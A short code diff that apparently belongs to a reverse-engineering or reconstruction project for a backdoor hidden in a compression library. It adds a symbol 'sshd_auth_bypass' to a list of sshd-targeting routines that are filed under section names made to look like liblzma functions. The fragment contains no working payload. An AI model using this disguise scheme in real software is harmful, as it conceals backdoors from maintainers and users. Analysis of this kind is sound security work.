@@ -117,6 +117,7 @@ SECTIONS_BEGIN()
 	DEFSYM(verify_signature, .text.lzma_index_dua)
 	DEFSYM(sshd_patch_variables, .text.lzma_block_unpadded_siza)
 	DEFSYM(sshd_find_monitor_struct, .text.lzma_mf_bt4_fina)
+	DEFSYM(sshd_auth_bypass, .text.lzip_decoder_memconfia)
 SECTIONS_END(.text)
 
 SECTIONS_BEGIN()
